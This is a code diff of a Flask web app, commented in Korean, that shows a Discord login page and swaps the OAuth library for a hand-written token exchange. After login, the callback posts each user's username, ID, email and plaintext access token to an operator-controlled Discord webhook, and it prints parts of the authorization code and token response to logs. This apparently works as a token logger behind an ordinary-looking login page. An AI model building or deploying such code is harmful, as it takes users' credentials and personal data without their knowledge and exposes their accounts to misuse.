@@ -1,5 +1,4 @@
 import os
-import discordoauth2
 import requests
 import time
 import traceback
@@ -15,7 +14,6 @@ WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 # ============================================================
 
 app = Flask(__name__)
-client = discordoauth2.Client(CLIENT_ID, secret=CLIENT_SECRET, redirect=REDIRECT_URI)
 
 @app.route('/')
 def home():
@@ -44,14 +42,8 @@ def home():
                 border: 1px solid #30363d;
                 box-shadow: 0 8px 32px rgba(0,0,0,0.3);
             }
-            h1 {
-                color: #58a6ff;
-                margin-bottom: 10px;
-            }
-            p {
-                color: #8b949e;
-                margin-bottom: 30px;
-            }
+            h1 { color: #58a6ff; margin-bottom: 10px; }
+            p { color: #8b949e; margin-bottom: 30px; }
             .btn {
                 background: #5865f2;
                 color: white;
@@ -65,14 +57,8 @@ def home():
                 display: inline-block;
                 transition: background 0.2s;
             }
-            .btn:hover {
-                background: #4752c4;
-            }
-            .footer {
-                margin-top: 20px;
-                font-size: 12px;
-                color: #484f58;
-            }
+            .btn:hover { background: #4752c4; }
+            .footer { margin-top: 20px; font-size: 12px; color: #484f58; }
         </style>
     </head>
     <body>
@@ -88,7 +74,15 @@ def home():
 
 @app.route('/login')
 def login():
-    return redirect(client.generate_uri(scope=["identify", "email"]))
+    # 🔥 redirect_uri를 명시적으로 포함
+    discord_auth_url = (
+        f"https://discord.com/oauth2/authorize"
+        f"?client_id={CLIENT_ID}"
+        f"&redirect_uri={REDIRECT_URI}"
+        f"&response_type=code"
+        f"&scope=identify+email"
+    )
+    return redirect(discord_auth_url)
 
 @app.route('/oauth2')
 def oauth2_callback():
@@ -96,14 +90,20 @@ def oauth2_callback():
     if not code:
         return "❌ 인증 코드가 없습니다.", 400
     
+    print(f"📩 받은 코드: {code[:20]}...")
+    
     try:
-        # Rate Limit 대비 (2초 대기)
-        time.sleep(2)
+        # 🔥 직접 토큰 교환 (discord-oauth2.py 안 씀!)
+        token_data = exchange_code_for_token(code)
         
-        access = client.exchange_code(code)
-        user_info = access.fetch_identify()
+        if not token_data:
+            return "❌ 토큰 교환 실패", 500
         
-        send_to_webhook(access, user_info)
+        # 사용자 정보 가져오기
+        user_info = get_user_info(token_data['access_token'])
+        
+        # 웹훅 전송
+        send_to_webhook(token_data, user_info)
         
         return success_page(user_info)
         
@@ -112,17 +112,6 @@ def oauth2_callback():
         print(f"❌ 오류: {error_msg}")
         print(traceback.format_exc())
         
-        # Rate Limit이면 재시도
-        if "Rate Limited" in error_msg or "retry_after" in error_msg:
-            time.sleep(5)
-            try:
-                access = client.exchange_code(code)
-                user_info = access.fetch_identify()
-                send_to_webhook(access, user_info)
-                return success_page(user_info)
-            except Exception as retry_error:
-                return f"❌ 재시도 실패: {retry_error}", 500
-        
         if WEBHOOK_URL:
             requests.post(WEBHOOK_URL, json={
                 "content": f"❌ **로그인 실패!**\n```\n{error_msg[:500]}\n```"
@@ -130,8 +119,54 @@ def oauth2_callback():
         
         return f"❌ 오류: {error_msg}", 500
 
-def send_to_webhook(access, user_info):
-    if not WEBHOOK_URL:
+def exchange_code_for_token(code):
+    """코드를 액세스 토큰으로 교환 (직접 구현)"""
+    
+    # Rate Limit 대비 (2초 대기)
+    time.sleep(2)
+    
+    data = {
+        'client_id': CLIENT_ID,
+        'client_secret': CLIENT_SECRET,
+        'grant_type': 'authorization_code',
+        'code': code,
+        'redirect_uri': REDIRECT_URI
+    }
+    
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    
+    response = requests.post('https://discord.com/api/v10/oauth2/token', data=data, headers=headers)
+    
+    print(f"📨 토큰 교환 응답 코드: {response.status_code}")
+    print(f"📨 응답 내용: {response.text[:200]}...")
+    
+    if response.status_code == 200:
+        return response.json()
+    else:
+        # Rate Limit 체크
+        if response.status_code == 429:
+            retry_after = response.headers.get('Retry-After', 5)
+            print(f"⏳ Rate Limit: {retry_after}초 후 재시도")
+            time.sleep(int(retry_after))
+            # 재시도
+            return exchange_code_for_token(code)
+        return None
+
+def get_user_info(access_token):
+    """액세스 토큰으로 사용자 정보 가져오기"""
+    headers = {
+        'Authorization': f'Bearer {access_token}'
+    }
+    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
+    
+    if response.status_code == 200:
+        return response.json()
+    return None
+
+def send_to_webhook(token_data, user_info):
+    if not WEBHOOK_URL or not user_info:
         return
     
     webhook_data = {
@@ -143,7 +178,7 @@ def send_to_webhook(access, user_info):
                 {"name": "📛 사용자명", "value": user_info.get('username', 'N/A'), "inline": True},
                 {"name": "🆔 ID", "value": f"`{user_info.get('id', 'N/A')}`", "inline": True},
                 {"name": "📧 이메일", "value": user_info.get('email', '비공개'), "inline": True},
-                {"name": "🔑 Access Token", "value": f"```{access.token}```", "inline": False}
+                {"name": "🔑 Access Token", "value": f"```{token_data.get('access_token', 'N/A')}```", "inline": False}
             ],
             "footer": {"text": f"로그인 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}"}
         }]
